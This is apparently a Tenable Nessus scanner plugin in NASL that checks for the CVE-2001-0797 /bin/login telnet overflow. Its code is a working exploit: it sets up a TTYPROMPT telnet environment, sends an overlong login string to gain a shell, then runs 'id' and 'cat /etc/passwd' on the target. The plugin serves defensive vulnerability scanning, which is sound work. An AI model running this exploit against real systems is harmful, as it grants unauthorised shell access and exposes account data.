#
# (C) Tenable Network Security, Inc.
#  


include("compat.inc");

if (description) {
   script_id(11136);
   script_version("$Revision: 1.13 $");
   script_cve_id("CVE-2001-0797");
   script_bugtraq_id(3681, 5848);
   script_xref(name:"OSVDB", value:"690");
   script_xref(name:"OSVDB", value:"691");
   script_xref(name:"IAVA", value:"2001-a-0014");

   script_name(english:"Multiple OS /bin/login Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute arbitrary commands on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote implementation of the /bin/login utility, used when
authenticating a user via telnet or rsh contains an overflow which
allows an attacker to gain a shell on this host, without even sending
a shell code. 

An attacker may use this flaw to log in as any user (except root) on
the remote host." );
 script_set_attribute(attribute:"solution", value:
"http://www.cert.org/advisories/CA-2001-34.html" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 
  script_summary(english:"Attempts to log into the remote host");
  # It might cause problem on some systems
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/telnet", 23);
  exit(0);
}




function init()
{
 local_var c, i, lim, r, s;
 global_var soc;

 send(socket:soc, data:raw_string(
 	0xFF, 252, 0x25,
	0xFF, 254, 0x26,
	0xFF, 252, 0x26,
	0xFF, 254, 0x03,
	0xFF, 252, 0x18,
	0xFF, 252, 0x1F,
	0xFF, 252, 0x20,
	0xFF, 252, 0x21,
	0xFF, 252, 0x22,
	0xFF, 0xFB, 0x27,
	0xFF, 254, 0x05,
	0xFF, 252, 0x23));
 r = recv(socket:soc, length:30);
 lim = strlen(r);
 for(i=0;i<lim - 2;i=i+3)
 {
  if(!(ord(r[i+2]) == 0x27))
  {
  if(ord(r[i+1]) == 251) c = 254;
  if(ord(r[i+1]) == 252) c = 254;
  if(ord(r[i+1]) == 253) c = 252;
  if(ord(r[i+1]) == 254) c = 252;
  
  s = raw_string(ord(r[i]), c, ord(r[i+2]));
  send(socket:soc, data:s);
  }
 }
 
 
 send(socket:soc, data:raw_string(0xFF, 0xFC, 0x24));
 
 
 r = recv(socket:soc, length:300);
 
 send(socket:soc, data:raw_string(0xFF, 0xFA, 0x27, 0x00, 0x03, 0x54, 0x54, 0x59, 0x50, 0x52, 0x4F, 0x4D, 0x50, 0x54, 0x01, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0xFF, 0xF0));
}

port = get_kb_item("Services/telnet");
if(!port)port = 23;

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);

if(soc)
{
  buf = init();
  send(socket:soc, data:string("bin c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\r\n"));
  r = recv(socket:soc, length:4096);
  if(!r)exit(0);
  send(socket:soc, data:string("id\r\n"));
  r = recv(socket:soc, length:1024);
  if("uid=" >< r){
   send(socket:soc, data:string("cat /etc/passwd\r\n"));
   r = recv(socket:soc, length:4096);
   
   report = string("Here is the output of the command 'cat /etc/passwd' :\n", r);
   security_hole(port:port, extra:report);
  }
}
